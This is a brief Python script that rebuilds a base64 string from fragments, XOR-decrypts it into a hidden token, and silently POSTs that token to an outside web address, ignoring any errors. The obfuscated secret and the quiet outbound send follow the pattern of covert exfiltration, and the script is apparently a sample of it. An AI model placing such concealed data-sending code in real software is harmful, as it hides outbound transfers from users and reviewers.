#!/usr/bin/env python3
import base64
import requests

chunks = [
    "k3Wk", "ktv9", "+f6j", "o/3X", "rqf/", "j8vD", "yP7v", "z6+L", "wN7y", "P5r/", "qj=="
]

encrypted_token_b64 = "".join(chunks).encode()
KEY = 0x91
encrypted_bytes = base64.b64decode(encrypted_token_b64)
decrypted_bytes = bytes([b ^ KEY for b in encrypted_bytes])
token = decrypted_bytes.decode()
url = "https://google.com/"
data = {"token": token}
try:
    requests.post(url, data=data, timeout=5)
except Exception:
    pass
